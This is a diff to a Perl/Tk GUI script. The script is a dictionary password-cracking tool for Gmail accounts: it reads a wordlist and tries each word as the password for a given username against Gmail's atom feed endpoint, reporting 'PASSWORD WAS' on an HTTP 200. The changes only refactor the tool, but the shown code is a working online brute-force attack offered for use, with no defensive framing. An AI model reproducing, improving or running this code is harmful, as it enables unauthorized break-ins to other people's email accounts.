@@ -4,13 +4,14 @@ use strict;
 use warnings;
 
 use Tk;
+use Cwd;
 use WWW::Curl::Easy;
 
 require Tk::Table;
 require Tk::FileSelect;
 
 my($UserName, $Password, $Site, $CurlReturn, $File, $Pane,
-	$ResponseCode, $Curl, $Path, $Yada, $Allow );
+	$ResponseCode, $Curl, $Path, $Yada, $Allow, $CWD );
 
 my(@ARG, @Curl, @LogFile);
 
@@ -61,11 +62,15 @@ my $ConnectButton = $Table->Button( -text => "Start Crackn", -command => \&Crack
 ## PACK TABLE AS SEPERATE CALL. CANNOT PACK DIRECTLT WITH WIDGET OR IT WILL FAIL.
 $Table->pack();
 
+$MainWindow->bind('<KeyRelease-Return>' => \&Crackn);
+
 MainLoop;
 
 sub choose_dir {
-			
-my $FileSelector = $MainWindow->FileSelect( -directory => '/' );
+
+$CWD = getcwd();			
+
+my $FileSelector = $MainWindow->FileSelect( -directory => $CWD );
 
 	$File = $FileSelector->Show; 
 
@@ -95,7 +100,7 @@ my $FileSelector = $MainWindow->FileSelect( -directory => '/' );
 
 sub Crackn { 
 
-$Yada = $ListEntry->get;
+print $Yada = $ListEntry->get;
 
 	$Allow = 0;
 
@@ -118,10 +123,6 @@ $Yada = $ListEntry->get;
 
 			&path_check;
 
-			$Pane->insert("end", "\n\nCracking, please wait.\n\n");
-	
-			$MainWindow->update;
-
 			#if( &path_check ) {
 
 				#$Pane->insert("end", "\nDictionary Path => $File\n");
@@ -130,10 +131,15 @@ $Yada = $ListEntry->get;
 
 		}
 
+	if( defined( $File ) ) {
 
+		open(FILE, '<', $File) or die "Cannot open $File: $!\n";
+
+	}
 
 $UserName = $UserEntry->get;
-$MainWindow->update;
+
+#$MainWindow->update;
 
 	if($UserName eq '') {
 		print "\nEmpty user Name.\n";
@@ -141,55 +147,64 @@ $MainWindow->update;
 		return;
 	}
 
+		elsif( defined( $UserName ) ) {
 
-$Pane->insert("end", "\nGmail User Name => $UserName\n");
-$MainWindow->update;
+			$Pane->insert("end", "\nGmail User Name => $UserName\n");
 
-open(FILE, '<', $File) or die "Cannot open $File: $!\n";
+			$MainWindow->update;
 
-        $Site = 'https://mail.google.com/mail/feed/atom';
+		}
 
-        $Curl = WWW::Curl::Easy->new;
+	if( $UserName && $Yada | $File ) {
 
-while(<FILE>) {
+		$Pane->insert("end", "\n\nCracking, please wait.\n\n");
+	
+		$MainWindow->update;	
 
-	#last unless defined $_;
+		$Site = 'https://mail.google.com/mail/feed/atom';
+	
+		$Curl = WWW::Curl::Easy->new;
 
-        $Curl->setopt(CURLOPT_TIMEOUT, 20);
+	while(<FILE>) {
 
-        $Curl->setopt(CURLOPT_CONNECTTIMEOUT, 15);
+        	$Curl->setopt(CURLOPT_TIMEOUT, 20);
 
-        $Curl->setopt(CURLOPT_VERBOSE, 1);
+        	$Curl->setopt(CURLOPT_CONNECTTIMEOUT, 15);
 
-        #$Curl->setopt(CURLOPT_HEADER, 1);
+        	$Curl->setopt(CURLOPT_VERBOSE, 1);
 
-        $Curl->setopt(CURLOPT_USERPWD, "$UserName:$_");
+        	#$Curl->setopt(CURLOPT_HEADER, 1);
 
-        $Curl->setopt(CURLOPT_URL, $Site);
+        	$Curl->setopt(CURLOPT_USERPWD, "$UserName:$_");
+
+        	$Curl->setopt(CURLOPT_URL, $Site);
  
-        $CurlReturn = $Curl->perform;
+        	$CurlReturn = $Curl->perform;
 
-        $ResponseCode = $Curl->getinfo(CURLINFO_HTTP_CODE);
+        	$ResponseCode = $Curl->getinfo(CURLINFO_HTTP_CODE);
 
-        if( $ResponseCode == 200 ) {
 
-		$Pane->insert("end", "\nPASSWORD WAS => $_\n");
+        	if( $ResponseCode == 200 ) {
 
-                print "\n\nPASSWORD WAS $_\n\n";
+			$Pane->insert("end", "\nPASSWORD WAS => $_\n");
 
-                return;
+                	print "\n\nPASSWORD WAS $_\n\n";
 
-        }
+                	return;
 
-                else {
+        	}
 
-                	print "\n\nPASSWORD WAS NOT $_\n\n";
+			else {
 
-                }
+				print "\n\nPASSWORD WAS NOT $_\n\n";
 
- }
+			}
 
-}
+	 } ## END OF DICTIONARY FILE ITERATION WHILE LOOP.
+
+	} ## END OF IF LOOP
+
+};
 
 sub warning {
 my $Tlw = $MainWindow->Toplevel;
@@ -245,6 +260,8 @@ my $Tlw = $MainWindow->Toplevel;
 my $Label = $Tlw->Label( -text => "User Name is empty. Please \nprovide a user name." )->pack( -side => 'top', 
 		-pady => '15' );
 
+	$Pane->insert("end", "\nUser Name is empty. Please provide a user name.\n");
+
 	$Tlw->Button( -text => "OK",
 			-command => sub { $Tlw->withdraw }, )->pack( -side => 'bottom', 
 					-anchor => 'se', 
@@ -265,10 +282,4 @@ my $Label = $Tlw->Label( -text => "Path dir is empty. Please \nprovide a path na
 					-anchor => 'se', 
 					-padx => '5', 
 					-pady => '5' );
-};
-
-sub validity_check {
-
-
-
 };
